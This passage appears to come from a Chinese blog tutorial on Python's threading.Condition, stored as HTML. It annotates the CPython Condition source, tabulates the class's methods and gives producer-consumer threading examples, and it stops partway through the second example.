        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="使用条件进行线程同步"><a href="#使用条件进行线程同步" class="headerlink" title="使用条件进行线程同步"></a>使用条件进行线程同步</h2><blockquote><p>互斥锁是最简单的线程同步机制,Python提供的<code>Condition</code> 对象提供了对复杂线程同步问题的支持.<code>Condition</code>被称为条件变量,除了提供与<code>Lock</code>类似的<code>acquire和release</code>方法外,还提供了<code>wait和notify</code>方法.</p><ul><li>线程首先<code>acquire</code>一个条件变量,然后判断一些条件,如果条件不满足则<code>wait</code>.</li><li>如果条件满足,进行一些处理改变条件后,通过<code>notify</code>方法通知其他线程.</li><li>其他处于<code>wait</code>状态的线程接到通知后会重新判断条件.</li><li>不断的重复这一过程,从而解决复杂的同步问题.</li></ul><p><code>Condition</code>对象维护了一个锁(<code>Lock/RLock</code>)和一个<code>waiting</code>池(这里的<code>waitting</code>池指的是<code>deque</code>双端队列).线程通过<code>acquire</code>获得<code>Condition</code>对象,当调用<code>wait</code>方法时,线程会释放<code>Condition</code>内部的锁并进入<code>blocked</code>状态,同时在<code>waiting</code>池中记录这个线程.当调用<code>notify</code>方法时,<code>Condition</code>对象会从<code>waiting</code>池中挑选一个线程,通知其调用<code>acquire</code>方法尝试取到锁。</p><p><code>Condition</code>对象如果没有指定锁的类型,会在内部自行创建一个<code>RLock</code>.除了<code>notify</code>方法外,还提供了<code>notifyAll</code>方法,可以通知waiting池中的所有线程尝试<code>acquire</code>内部锁.由于上述机制,处于waiting状态的线程只能通过notify方法唤醒,所以notifyAll的作用在于防止有线程永远处于沉默状态.</p></blockquote><h3 id="1-源码分析"><a href="#1-源码分析" class="headerlink" title="1.源码分析"></a>1.源码分析</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">from</span> _collections <span class="token keyword">import</span> deque <span class="token keyword">as</span> _deque<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> deque <span class="token keyword">as</span> _deque<span class="token comment" spellcheck="true"># condithon 是一把高级的锁</span><span class="token keyword">class</span> <span class="token class-name">Condition</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> lock<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 默认是没有锁</span><span class="token keyword">if</span> lock <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 加入锁也会变成可重入的锁</span>   lock <span class="token operator">=</span> RLock<span class="token punctuation">(</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>_lock <span class="token operator">=</span> lockself<span class="token punctuation">.</span>acquire <span class="token operator">=</span> lock<span class="token punctuation">.</span>acquire     <span class="token comment" spellcheck="true"># 实例化对象获取到的底层锁</span>self<span class="token punctuation">.</span>release <span class="token operator">=</span> lock<span class="token punctuation">.</span>release     <span class="token comment" spellcheck="true"># 实例化对象释放底层锁</span><span class="token keyword">try</span><span class="token punctuation">:</span>   self<span class="token punctuation">.</span>_release_save <span class="token operator">=</span> lock<span class="token punctuation">.</span>_release_save <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>   <span class="token keyword">pass</span><span class="token keyword">try</span><span class="token punctuation">:</span>   self<span class="token punctuation">.</span>_acquire_restore <span class="token operator">=</span> lock<span class="token punctuation">.</span>_acquire_restore<span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>   <span class="token keyword">pass</span><span class="token keyword">try</span><span class="token punctuation">:</span>   self<span class="token punctuation">.</span>_is_owned <span class="token operator">=</span> lock<span class="token punctuation">.</span>_is_owned<span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>   <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 双端队列,会在调用wait 时添加一个原始锁,个数变为1</span>self<span class="token punctuation">.</span>_waiters <span class="token operator">=</span> _deque<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 等待池,deque是一个双端队列</span>    <span class="token comment" spellcheck="true"># 以下方法,实现了__enter__,实现了__exit__ ,可以用上下文管理器调用</span><span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>__enter__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>__exit__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"&lt;Condition(%s, %d)>"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_lock<span class="token punctuation">,</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_waiters<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_release_save</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 释放实例化对象获得锁</span>self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># No state to save</span><span class="token keyword">def</span> <span class="token function">_acquire_restore</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># Ignore saved state</span><span class="token keyword">def</span> <span class="token function">_is_owned</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   self<span class="token punctuation">.</span>_lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">wait</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> timeout<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>_is_owned<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"cannot wait on un-acquired lock"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># _allocat_lock = thread.lock,是一个原始锁</span>waiter <span class="token operator">=</span> _allocate_lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取原始锁</span>waiter<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 双端队列添加原始锁</span>self<span class="token punctuation">.</span>_waiters<span class="token punctuation">.</span>append<span class="token punctuation">(</span>waiter<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 释放底层锁,即实例化对象获得的锁</span><span class="token comment" spellcheck="true"># 返回 True /False</span>saved_state <span class="token operator">=</span> self<span class="token punctuation">.</span>_release_save<span class="token punctuation">(</span><span class="token punctuation">)</span>gotit <span class="token operator">=</span> <span class="token boolean">False</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># restore state no matter what (e.g., KeyboardInterrupt)</span>   <span class="token keyword">if</span> timeout <span class="token keyword">is</span> None<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># 尝试去获取原始锁</span>       <span class="token comment" spellcheck="true"># 阻塞waitting池中的所有线程</span>       <span class="token comment" spellcheck="true"># 使得gotit = True</span>       waiter<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>       gotit <span class="token operator">=</span> <span class="token boolean">True</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> timeout <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>           gotit <span class="token operator">=</span> waiter<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           gotit <span class="token operator">=</span> waiter<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> gotit<span class="token keyword">finally</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># 如果获取不到锁则立即返回False</span>   <span class="token comment" spellcheck="true"># </span>   self<span class="token punctuation">.</span>_acquire_restore<span class="token punctuation">(</span>saved_state<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 如果阻塞了所有线程,不执行,</span>   <span class="token comment" spellcheck="true"># 没有阻塞线程</span>   <span class="token keyword">if</span> <span class="token operator">not</span> gotit<span class="token punctuation">:</span>       <span class="token keyword">try</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 释放了watting池的锁</span>           self<span class="token punctuation">.</span>_waiters<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>waiter<span class="token punctuation">)</span>       <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>           <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">wait_for</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> predicate<span class="token punctuation">,</span> timeout<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>endtime <span class="token operator">=</span> Nonewaittime <span class="token operator">=</span> timeoutresult <span class="token operator">=</span> predicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token operator">not</span> result<span class="token punctuation">:</span>   <span class="token keyword">if</span> waittime <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>       <span class="token keyword">if</span> endtime <span class="token keyword">is</span> None<span class="token punctuation">:</span>           endtime <span class="token operator">=</span> _time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> waittime       <span class="token keyword">else</span><span class="token punctuation">:</span>           waittime <span class="token operator">=</span> endtime <span class="token operator">-</span> _time<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> waittime <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>   self<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>waittime<span class="token punctuation">)</span>   result <span class="token operator">=</span> predicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">notify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>_is_owned<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"cannot notify on un-acquired lock"</span><span class="token punctuation">)</span>all_waiters <span class="token operator">=</span> self<span class="token punctuation">.</span>_waiters   <span class="token comment" spellcheck="true"># 等于 deque  一个双端队列</span><span class="token comment" spellcheck="true"># 获取双端队列中的锁/或者里面没有锁</span>waiters_to_notify <span class="token operator">=</span> _deque<span class="token punctuation">(</span>_islice<span class="token punctuation">(</span>all_waiters<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> waiters_to_notify<span class="token punctuation">:</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true"># 针对有锁的情况下, 把锁去掉,可以让下一个线程重新去获取锁.</span><span class="token keyword">for</span> waiter <span class="token keyword">in</span> waiters_to_notify<span class="token punctuation">:</span>   waiter<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 等待池中线程释放锁</span>   <span class="token keyword">try</span><span class="token punctuation">:</span>       all_waiters<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>waiter<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 移除已经释放了锁的线程</span>   <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>       <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">notify_all</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>notify<span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_waiters<span class="token punctuation">)</span><span class="token punctuation">)</span>notifyAll <span class="token operator">=</span> notify_all  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样,很明显的看出是有2个阶段的,第一阶段,没有调用<code>wait</code> ,第二阶段,调用了<code>wait</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-26/1606400741746-waiting1.png"><br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-26/1606400749575-waiting2.png"></p></blockquote><h3 id="2-方法和属性"><a href="#2-方法和属性" class="headerlink" title="2.方法和属性"></a>2.方法和属性</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">threading</span><span class="token punctuation">.</span>Condition<span class="token punctuation">(</span>lock<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>Condition<span class="token punctuation">)</span>function<span class="token punctuation">:</span>notify<span class="token punctuation">:</span> Wake up one <span class="token operator">or</span> more threads waiting on this condition<span class="token punctuation">,</span> <span class="token keyword">if</span> any<span class="token punctuation">.</span>notifyAll<span class="token punctuation">:</span> Wake up all threads waiting on this condition<span class="token punctuation">.</span>notify_all<span class="token punctuation">:</span> Wake up all threads waiting on this condition<span class="token punctuation">.</span>wait<span class="token punctuation">:</span> Wait until notified <span class="token operator">or</span> until a timeout occurs<span class="token punctuation">.</span>wait_for<span class="token punctuation">:</span> Wait until a condition evaluates to <span class="token boolean">True</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th><code>acquire()</code></th><th align="left">获取锁</th></tr></thead><tbody><tr><td><code>release()</code></td><td align="left">释放锁</td></tr><tr><td><code>wait(timeout=None)</code></td><td align="left">等待<code>notify()</code>方法唤醒,或者是timeout发生</td></tr><tr><td><code>wait_for(predicate,timeout=None)</code></td><td align="left">等待一直到条件为真</td></tr><tr><td><code>notify(n=1)</code></td><td align="left">默认唤醒一个等待condition的线程,可以有n个</td></tr><tr><td><code>notify_all</code></td><td align="left">唤醒所有等待<code>condition</code> 的线程</td></tr></tbody></table></blockquote><h3 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h3><blockquote><p>演示条件变量同步的经典问题是生产者与消费者问题：</p><p>假设有一群生产者(Producer)和一群消费者(Consumer)通过一个市场来交互产品.生产者的策略是如果市场上剩余的产品少于1000个,那么就生产100个产品放到市场上;而消费者的策略是如果市场上剩余产品的数量多余100个,那么就消费3个产品.</p><p>每一个线程的执行流程如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-26/1606400796286-thread.png"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> threading<span class="token punctuation">,</span>timecount <span class="token operator">=</span> <span class="token number">500</span><span class="token keyword">class</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>cond <span class="token operator">=</span> conditionsuper<span class="token punctuation">(</span>Producer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">global</span> count<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 获取condition锁</span>       <span class="token comment" spellcheck="true"># 提供判断条件</span>       <span class="token keyword">if</span> count <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">:</span>           count <span class="token operator">+=</span> <span class="token number">100</span>           msg <span class="token operator">=</span> <span class="token string">'{} produce 100, count:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> str<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>           self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>notify<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 唤醒waiting池中的线程.通知其他线程去重新获取锁</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 加入到waiting池中,线程self.cond.release(),并阻塞</span>       self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 释放condition锁</span>       time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>cond <span class="token operator">=</span> conditionsuper<span class="token punctuation">(</span>Consumer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">global</span> count<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> count <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>           count <span class="token operator">-=</span> <span class="token number">3</span>           msg <span class="token operator">=</span> <span class="token string">'{} consumer 3,count:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> str<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>           self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>notify<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>       self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>       time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>condition <span class="token operator">=</span> threading<span class="token punctuation">.</span>Condition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>p <span class="token operator">=</span> Producer<span class="token punctuation">(</span>condition<span class="token punctuation">)</span>p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>c <span class="token operator">=</span> Consumer<span class="token punctuation">(</span>condition<span class="token punctuation">)</span>c<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:获取几次锁,就要释放几次锁.</p><p>实例: 向列表中添加整数.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">from</span> collections <span class="token keyword">import</span> deque<span class="token triple-quoted-string string">"""在双端队列中添加整数,双端队列具有线程安全的特性"""</span><span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>int <span class="token operator">=</span> integers  self<span class="token punctuation">.</span>cond <span class="token operator">=</span> condition  super<span class="token punctuation">(</span>Producter<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">"""在随机时间在队列中添加一个整数"""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      integer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 获取condition锁</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Producter condition lock acquire by {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">if</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>int<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>              self<span class="token punctuation">.</span>int<span class="token punctuation">.</span>appendleft<span class="token punctuation">(</span>integer<span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>int<span class="token punctuation">)</span>              self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>notify<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 条件满足,执行完毕后,通知waiting池中线程运行</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加不满足时,添加到waiting池中,阻塞线程</span>          self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>          time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> condition<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>int <span class="token operator">=</span> integers  self<span class="token punctuation">.</span>cond <span class="token operator">=</span> condition  super<span class="token punctuation">(</span>Consumer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Consumer condition acquired by %s '</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>          <span class="token keyword">if</span> self<span class="token punctuation">.</span>int<span class="token punctuation">:</span>              integer<span class="token operator">=</span>self<span class="token punctuation">.</span>int<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'popleft {} from deque by {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>integer<span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>              self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>notify<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>          self<span class="token punctuation">.</span>cond<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>          time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>deq <span class="token operator">=</span> deque<span class="token punctuation">(</span><span class="token punctuation">)</span>condition <span class="token operator">=</span> threading<span class="token punctuation">.</span>Condition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  p <span class="token operator">=</span> Producter<span class="token punctuation">(</span>deq<span class="token punctuation">,</span> condition<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  c <span class="token operator">=</span> Consumer<span class="token punctuation">(</span>deq<span 